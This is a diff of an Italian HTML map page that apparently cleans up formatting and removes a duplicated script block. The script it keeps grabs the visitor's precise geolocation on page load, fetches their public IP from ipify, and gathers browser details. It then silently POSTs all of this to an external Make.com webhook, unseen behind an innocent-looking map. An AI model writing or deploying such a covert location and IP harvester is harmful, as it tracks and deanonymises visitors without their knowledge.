@@ -1,4 +1,4 @@
-l<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="it">
 <head>
   <meta charset="UTF-8" />
@@ -49,66 +49,54 @@ l<!DOCTYPE html>
   <div id="map"></div>
 
   <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
-<script>
-  const webhook = "https://hook.eu1.make.com/iu8aa7aatmrxy67k2l0mc9dvud48471u";
+  <script>
+    const webhook = "https://hook.eu1.make.com/iu8aa7aatmrxy67k2l0mc9dvud48471u";
 
-  async function sendData(lat, lon) {
-    try {
-      const ipRes = await fetch('https://api64.ipify.org?format=json');
-      const ipData = await ipRes.json();
-      const timestamp = new Date().toISOString();
+    async function sendData(lat, lon) {
+      try {
+        const ipRes = await fetch('https://api64.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        const timestamp = new Date().toISOString();
 
-      const payload = {
-        latitude: lat,
-        longitude: lon,
-        timestamp: timestamp,
-        ip: ipData.ip,
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language
-      };
+        const payload = {
+          latitude: lat,
+          longitude: lon,
+          timestamp: timestamp,
+          ip: ipData.ip,
+          userAgent: navigator.userAgent,
+          platform: navigator.platform,
+          language: navigator.language
+        };
 
-      await fetch(webhook, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
-      });
-    } catch (error) {
-      console.error("Errore durante l'invio:", error);
+        await fetch(webhook, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+      } catch (error) {
+        console.error("Errore durante l'invio:", error);
+      }
     }
-  }
 
-  navigator.geolocation.getCurrentPosition(pos => {
-  const lat = pos.coords.latitude;
-  const lon = pos.coords.longitude;
+    navigator.geolocation.getCurrentPosition(pos => {
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
 
-  const map = L.map('map').setView([lat, lon], 13);
-  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-    attribution: '',
-    maxZoom: 19
-  }).addTo(map);
-  L.marker([lat, lon]).addTo(map);
+      const map = L.map('map').setView([lat, lon], 13);
+      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+        attribution: '',
+        maxZoom: 19
+      }).addTo(map);
+      L.marker([lat, lon]).addTo(map);
 
-  sendData(lat, lon);
-}, err => {
-  alert("Errore nel recupero della posizione.");
-}, {
-  enableHighAccuracy: true,
-  timeout: 10000,
-  maximumAge: 0
-});
-
-    const map = L.map('map').setView([lat, lon], 13);
-    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-      attribution: '',
-      maxZoom: 19
-    }).addTo(map);
-    L.marker([lat, lon]).addTo(map);
-
-    sendData(lat, lon);
-  }, err => {
-    alert("Errore nel recupero della posizione.");
-  });
-</script>
+      sendData(lat, lon);
+    }, err => {
+      alert("Errore nel recupero della posizione.");
+    }, {
+      enableHighAccuracy: true,
+      timeout: 10000,
+      maximumAge: 0
+    });
+  </script>
 </body>
 </html>
